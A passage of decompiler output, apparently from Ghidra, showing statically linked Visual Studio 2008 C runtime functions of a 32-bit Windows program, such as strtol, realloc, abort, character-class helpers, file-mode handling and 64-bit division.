    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_0041c480:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_0041c480;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_0041c4e6;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_0041c4e6;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_0041c4e6;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_0041c4e6:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_0041c543:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((param_5 & 1U) == 0) {
            local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_0041c543;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)(uint)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_0041c543;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2008 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  undefined **ppuVar2;
  
  if (DAT_0042c1e8 == 0) {
    ppuVar2 = &PTR_DAT_0042ada0;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = strtoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



int __cdecl FUN_0041c621(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  int *piVar4;
  DWORD DVar5;
  LPVOID pvVar6;
  uint *local_24;
  int *local_20;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
    return (void *)0x0;
  }
  if (DAT_0042e8b8 == 3) {
    do {
      local_20 = (int *)0x0;
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_0041c814;
      __lock(4);
      local_24 = (uint *)___sbh_find_block((int)_Memory);
      if (local_24 != (uint *)0x0) {
        if (_NewSize <= DAT_0042e8c4) {
          iVar2 = ___sbh_resize_block(local_24,(int)_Memory,_NewSize);
          if (iVar2 == 0) {
            local_20 = ___sbh_alloc_block((uint *)_NewSize);
            if (local_20 != (int *)0x0) {
              puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
              if (_NewSize <= puVar3) {
                puVar3 = (uint *)_NewSize;
              }
              _memcpy(local_20,_Memory,(size_t)puVar3);
              local_24 = (uint *)___sbh_find_block((int)_Memory);
              ___sbh_free_block(local_24,(int)_Memory);
            }
          }
          else {
            local_20 = (int *)_Memory;
          }
        }
        if (local_20 == (int *)0x0) {
          if ((uint *)_NewSize == (uint *)0x0) {
            _NewSize = 1;
          }
          _NewSize = _NewSize + 0xf & 0xfffffff0;
          local_20 = (int *)HeapAlloc(DAT_0042be74,0,_NewSize);
          if (local_20 != (int *)0x0) {
            puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
            if (_NewSize <= puVar3) {
              puVar3 = (uint *)_NewSize;
            }
            _memcpy(local_20,_Memory,(size_t)puVar3);
            ___sbh_free_block(local_24,(int)_Memory);
          }
        }
      }
      FUN_0041c77f();
      if (local_24 == (uint *)0x0) {
        if ((uint *)_NewSize == (uint *)0x0) {
          _NewSize = 1;
        }
        _NewSize = _NewSize + 0xf & 0xfffffff0;
        local_20 = (int *)HeapReAlloc(DAT_0042be74,0,_Memory,_NewSize);
      }
      if (local_20 != (int *)0x0) {
        return local_20;
      }
      if (DAT_0042c1c4 == 0) {
        piVar4 = __errno();
        if (local_24 != (uint *)0x0) {
          *piVar4 = 0xc;
          return (void *)0x0;
        }
        goto LAB_0041c841;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
    if (local_24 != (uint *)0x0) goto LAB_0041c820;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_0041c814;
      if ((uint *)_NewSize == (uint *)0x0) {
        _NewSize = 1;
      }
      pvVar6 = HeapReAlloc(DAT_0042be74,0,_Memory,_NewSize);
      if (pvVar6 != (LPVOID)0x0) {
        return pvVar6;
      }
      if (DAT_0042c1c4 == 0) {
        piVar4 = __errno();
LAB_0041c841:
        DVar5 = GetLastError();
        iVar2 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar2;
        return (void *)0x0;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
  }
  DVar5 = GetLastError();
  iVar2 = __get_errno_from_oserr(DVar5);
  *piVar4 = iVar2;
  return (void *)0x0;
LAB_0041c814:
  __callnewh(_NewSize);
  piVar4 = __errno();
LAB_0041c820:
  *piVar4 = 0xc;
  return (void *)0x0;
}



void FUN_0041c77f(void)

{
  FUN_00413064(4);
  return;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2008 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  _PHNDLR p_Var2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if ((DAT_0042af30 & 1) != 0) {
    __NMSG_WRITE(10);
  }
  p_Var2 = ___get_sigabrt();
  if (p_Var2 != (_PHNDLR)0x0) {
    _raise(0x16);
  }
  if ((DAT_0042af30 & 2) != 0) {
    local_2d4 = 0x10001;
    _memset(&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_0042c1e8 == 0) {
    return *(ushort *)(PTR_DAT_0042ad88 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_0041ca7d;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_0041ca7d;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_0041ca7d;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_0041cb7b;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_0041ca7d;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_0041cacf;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_0041cacf:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_0041cb7b:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_0041ca7d;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_0041ca7d:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int iVar1;
  int *piVar2;
  char cVar3;
  byte bVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  piVar2 = &DAT_0042d780 + (_FileHandle >> 5);
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar1 = *piVar2 + iVar7;
  cVar3 = *(char *)(iVar1 + 0x24);
  bVar4 = *(byte *)(iVar1 + 4);
  if (_Mode == 0x4000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_0041cc49;
      *(byte *)(iVar1 + 4) = *(byte *)(iVar1 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar2 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_0041cc49:
  if ((bVar4 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar3 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    eVar2 = 0x16;
  }
  else {
    *_PMode = DAT_0042c578;
    eVar2 = 0;
  }
  return eVar2;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2008 Release

void __cdecl ___initconout(void)

{
  DAT_0042af38 = CreateFileA(s_CONOUT__00423c18,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  __flswbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flswbuf(int _Ch,FILE *_File)

{
  uint uVar1;
  char *_Buf;
  char *pcVar2;
  uint _FileHandle;
  int *piVar3;
  undefined **ppuVar4;
  int iVar5;
  undefined *puVar6;
  int unaff_EDI;
  uint _MaxCharCount;
  longlong lVar7;
  undefined4 local_8;
  
  _FileHandle = __fileno(_File);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
LAB_0041cd12:
    _File->_flag = _File->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar3 = __errno();
    *piVar3 = 0x22;
    goto LAB_0041cd12;
  }
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_cnt = 0;
  local_8 = 0;
  _MaxCharCount = 2;
  _File->_flag = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar4 = FUN_00414378(), _File != (FILE *)(ppuVar4 + 8) &&
       (ppuVar4 = FUN_00414378(), _File != (FILE *)(ppuVar4 + 0x10))) ||
      (iVar5 = __isatty(_FileHandle), iVar5 == 0)))) {
    __getbuf(_File);
  }
  if ((_File->_flag & 0x108U) == 0) {
    local_8 = CONCAT22(local_8._2_2_,(short)_Ch);
    local_8 = __write(_FileHandle,&local_8,2);
  }
  else {
    _Buf = _File->_base;
    pcVar2 = _File->_ptr;
    _File->_ptr = _Buf + 2;
    _MaxCharCount = (int)pcVar2 - (int)_Buf;
    _File->_cnt = _File->_bufsiz + -2;
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar6 = &DAT_0042a648;
      }
      else {
        puVar6 = (undefined *)((_FileHandle & 0x1f) * 0x40 + (&DAT_0042d780)[(int)_FileHandle >> 5])
        ;
      }
      if (((puVar6[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64(_FileHandle,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_0041ce49;
    }
    else {
      local_8 = __write(_FileHandle,_Buf,_MaxCharCount);
    }
    *(short *)_File->_base = (short)_Ch;
  }
  if (local_8 == _MaxCharCount) {
    return _Ch & 0xffff;
  }
LAB_0041ce49:
  _File->_flag = _File->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  ___ansicp
// 
// Library: Visual Studio 2008 Release

void __cdecl ___ansicp(LCID param_1)

{
  int iVar1;
  CHAR local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,local_10,6);
  if (iVar1 != 0) {
    _atol(local_10);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___convertcp
// 
// Library: Visual Studio 2008 Release

void __cdecl
___convertcp(UINT param_1,UINT param_2,char *param_3,uint *param_4,LPSTR param_5,int param_6)

{
  uint _Size;
  uint cbMultiByte;
  bool bVar1;
  BOOL BVar2;
  size_t sVar3;
  undefined4 *puVar4;
  int iVar5;
  LPSTR lpMultiByteStr;
  uint uVar6;
  bool bVar7;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_4;
  bVar1 = false;
  if (param_1 == param_2) goto LAB_0041d04b;
  BVar2 = GetCPInfo(param_1,&local_1c);
  if ((((BVar2 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar2 = GetCPInfo(param_2,&local_1c), BVar2 == 0)) || (local_1c.MaxCharSize != 1)) {
    uVar6 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = uVar6 == 0;
    if (bVar7) goto LAB_0041d04b;
  }
  else {
    bVar1 = true;
    uVar6 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      sVar3 = _strlen(param_3);
      uVar6 = sVar3 + 1;
    }
    bVar7 = uVar6 == 0;
  }
  if ((bVar7 || (int)uVar6 < 0) || (0x7ffffff0 < uVar6)) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    _Size = uVar6 * 2 + 8;
    if (_Size < 0x401) {
      puVar4 = (undefined4 *)&stack0xffffffbc;
      local_20 = (undefined4 *)&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_0041cf8b:
        local_20 = puVar4 + 2;
      }
    }
    else {
      puVar4 = (undefined4 *)_malloc(_Size);
      local_20 = puVar4;
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = 0xdddd;
        goto LAB_0041cf8b;
      }
    }
  }
  if (local_20 != (undefined4 *)0x0) {
    _memset(local_20,0,uVar6 * 2);
    iVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)local_20,uVar6);
    if (iVar5 != 0) {
      if (param_5 == (LPSTR)0x0) {
        if (((bVar1) ||
            (uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,(LPSTR)0x0,0,(LPCSTR)0x0,
                                         (LPBOOL)0x0), uVar6 != 0)) &&
           (lpMultiByteStr = (LPSTR)__calloc_crt(1,uVar6), lpMultiByteStr != (LPSTR)0x0)) {
          uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,lpMultiByteStr,uVar6,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (uVar6 == 0) {
            _free(lpMultiByteStr);
          }
          else if (cbMultiByte != 0xffffffff) {
            *param_4 = uVar6;
          }
        }
      }
      else {
        WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,param_5,param_6,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    __freea(local_20);
  }
LAB_0041d04b:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2008 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_0041d18c:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_0041d18c;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2008 Release

int __cdecl _tolower(int _C)

{
  if (DAT_0042c1e8 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_0041d2c1;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_0041d2c1:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0041d3ae. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __allshr
// 
// Library: Visual Studio

undefined8 __fastcall __allshr(byte param_1,int param_2)

{
  uint in_EAX;
  int iVar1;
  
  iVar1 = param_2 >> 0x1f;
  if (0x3f < param_1) {
    return CONCAT44(iVar1,iVar1);
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return CONCAT44(iVar1,param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
